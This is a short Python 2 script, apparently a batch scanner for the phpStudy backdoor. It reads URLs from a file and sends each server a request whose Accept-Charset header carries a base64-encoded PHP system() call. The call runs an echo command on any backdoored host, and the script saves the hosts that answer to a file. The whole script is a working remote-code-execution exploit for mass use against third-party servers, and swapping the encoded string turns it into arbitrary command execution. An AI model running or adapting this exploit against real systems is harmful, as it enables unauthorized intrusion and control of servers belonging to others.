#!/usr/bin/python
#-*- coding:utf-8 -*-
import requests,sys

headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding':'gzip,deflate',
            'Accept-Charset':'c3lzdGVtKCJlY2hvIHhjNjY2YSIpOw==',
            'Accept-Language':'zh-CN,zh;q=0.9',
            'Connection':'close',
            }

def phpstudy():
    try:
        txt = sys.argv[1]
        f = open(txt,'r')
        for x in f:
            try:
                if 'http' not in x:
                    x = 'http://' + x
                r = requests.get(url=x, headers=headers,timeout=5)
                if 'xc666' in r.text:
                    print u'over success：',x
                    f = open('success.txt','a+')
                    f.write(x)
                    f.close()
                else:
                    print u'flase：',x
            except:
                print u'连接超时',x
    except:
        print u"----------------------------"
        print u"  Email:758682207@qq.com"
        print u"----------------------------"
        print u"\n----phpstudy后门批量检测----\n"
        print u"Example：phpstudy.py url.txt"

if __name__ == '__main__':
    phpstudy()
